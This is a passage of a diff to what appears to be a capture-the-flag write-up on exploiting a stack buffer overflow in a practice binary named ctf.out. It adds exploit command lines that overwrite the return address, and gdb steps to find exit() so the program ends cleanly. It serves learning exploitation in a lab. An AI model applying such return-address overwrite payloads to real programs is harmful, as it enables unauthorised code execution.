@@ -190,10 +190,33 @@ The location of of `p` and `q` is: ` 100 + 4 (blank) + \x1b\x85\x04\x08 (ret) + 
 
 4. Conducting an attack:
 ```bash
-echo $(python -c "print('a'*104 + '\x1b\x85\x04\x08' + 'b'*4 + '\x11\x12\x08\x04' + '\x62\x42\x64\x44')")
+./ctf.out $(python -c "print('a'*104 + '\x1b\x85\x04\x08' + 'b'*4 + '\x11\x12\x08\x04' + '\x62\x42\x64\x44')")
 ```
 
+![image](https://github.com/user-attachments/assets/9d97933e-e7ed-4aa9-9747-f7210d9a1b81)
 
+5. Removing `Segmentation fault`:
+
+The reason why the program prints out `Segmentation fault` is because when `myfunc()` has ended, `myfunc()` takes the variable `s` out as the `eip` (which is wrong 'b'*4). So, we need to fill out exit in `s`. 
+
+```bash
+gdb ctf.out
+```
+
+What we need now is the address of exit(): 
+
+```bash
+info func 
+```
+![image](https://github.com/user-attachments/assets/29bb16aa-9f79-453f-bec9-9a9515beb940)
+
+Conducting the attack: 
+
+```bash
+./ctf.out $(python -c "print('a'*104 + '\x1b\x85\x04\x08' + '\xe0\x83\x04\x08' + '\x11\x12\x08\x04' + '\x62\x42\x64\x44')")
+```
+
+![image](https://github.com/user-attachments/assets/353de5cf-a398-4c91-8cd0-d40d292ece9e)
 
 
 
